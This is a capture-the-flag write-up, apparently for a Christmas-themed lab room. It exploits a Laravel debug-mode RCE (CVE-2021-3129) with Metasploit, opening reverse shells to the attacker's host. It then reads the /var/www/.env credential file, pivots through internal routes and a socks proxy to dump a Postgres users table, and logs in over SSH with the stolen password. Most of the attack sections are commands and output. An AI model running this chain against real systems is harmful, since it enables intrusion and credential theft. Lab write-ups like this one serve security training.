# Day 9

## Deploy the attached VM, and wait a few minutes. What ports are open?

```bash
nmap -T4 -A 10.10.154.224
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-13 10:30 EDT
Nmap scan report for 10.10.173.133
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Curabitur aliquet, libero id suscipit semper
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

{% hint style="info" %}
80
{% endhint %}

## What framework is the web application developed with?

Using `whatweb` to enumerate this website shows

{% code overflow="wrap" %}
```bash
whatweb http://10.10.154.224  
http://10.10.154.224 [200 OK] Apache[2.4.54], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], HttpOnly[laravel_session], IP[10.10.154.224], Laravel, PHP[7.4.30], Title[Curabitur aliquet, libero id suscipit semper], X-Powered-By[PHP/7.4.30]
```
{% endcode %}

The response of the network browser also confirms it

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Laravel
{% endhint %}

## What CVE is the application vulnerable to?

Search on google for Laravel CVE we can find this blog post:&#x20;

{% embed url="https://pentest-tools.com/blog/exploit-rce-vulnerability-laravel-cve-2021-3129" %}

{% hint style="info" %}
CVE-2021-3129
{% endhint %}

## What command can be used to upgrade the last opened session to a Meterpreter session?

Note that normal command shells do not support complex operations such as pivoting. In Metasploit’s console, you can upgrade the last opened Metasploit session to a Meterpreter session with `sessions -u -1`.

{% hint style="info" %}
sessions -u -1
{% endhint %}

## What file indicates a session has been opened within a Docker container?

A common way to tell if a compromised application is running in a Docker container is to verify the existence of a `/.dockerenv` file at the root directory of the filesystem.

{% hint style="info" %}
`/.dockerenv`
{% endhint %}

## What file often contains useful credentials for web applications?

The env file is a great way to find interesting things, usually on `/var/www/.env` or we can do a wide search on the OS with <mark style="color:green;">`find /tmp -iname .env -type f`</mark>

## What database table contains useful credentials?

Gain access to remove machine with metasploit

```
msfconsole
use exploit/multi/php/ignition_laravel_debug_rce
RHOSTS 10.10.154.224 HttpClientTimeout=30
set LHOST 10.8.30.181
run
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

* Get meterpreter session

```bash
background
sessions -u -1
sessions -i -1
```

Inside the `.env` file

```bash
cat /var/www/.env
```

```
DB_CONNECTION=pgsql
DB_HOST=webservice_database
DB_PORT=5432
DB_DATABASE=postgres
DB_USERNAME=postgres
DB_PASSWORD=postgres
```

* Lets try to resolve this DB\_HOST

```bash
meterpreter > resolve webservice_database

Host resolutions
================

    Hostname             IP Address
    --------             ----------
    webservice_database  172.28.101.51

```

As this is an internal IP address, it won’t be possible to send traffic to it directly. We can instead leverage the network pivoting support within msfconsole to reach the inaccessible host. To configure the global routing table in msfconsole, ensure you have run the `background` command from within a Meterpreter session:

```bash
background
route add 172.28.101.51/32 -1
```

We can also see, due to the presence of the `/.dockerenv` file, that we are in a docker container. By default, Docker chooses a hard-coded IP to represent the host machine. We will also add that to our routing table for later scanning:

```bash
route add 172.17.0.1/32 -1
```

* Print current routes with `route print`

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

With the previously discovered database credentials and the routing table configured, we can start to run Metasploit modules that target Postgres. Starting with a schema dump, followed by running queries to select information out of the database:

```bash
# Dump the schema
use auxiliary/scanner/postgres/postgres_schemadump
run postgres://postgres:postgres@172.28.101.51/postgres

# Select information from a specific table
use auxiliary/admin/postgres/postgres_sql
run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
```

{% hint style="info" %}
users
{% endhint %}

What is Santa's password?\



<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
p4\$$w0rd
{% endhint %}

## What ports are open on the host machine?

To further pivot through the private network, we can create a socks proxy within Metasploit:

```bash
use auxiliary/server/socks_proxy
run srvhost=127.0.0.1 srvport=9050 version=4a
```

* From the attacker machine (Kali Linux)

```bash
curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v

proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-11 14:27 CET
Nmap scan report for 172.17.0.1
Host is up (0.100s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
5432/tcp closed postgresql

Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds

```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
22,80
{% endhint %}

## What is the root flag?

With the password, credentials and proxy setup we can access the server as root

```bash
msfconsole
run ssh://santa:p4$$w0rd@172.17.0.1
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* Get meterpreter session here as well and find the flag

```bash
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         shell cmd/unix                                   10.8.30.181:4444 -> 10.10.154.224:56420 (10.10.154.224)
  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.8.30.181:4433 -> 10.10.154.224:44460 (172.28.101.50)
  3         shell linux            SSH parallels @           10.8.30.181-10.10.154.224:52780 -> 172.17.0.1:22 (172.17.0.1)


sessions -i -1
```

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
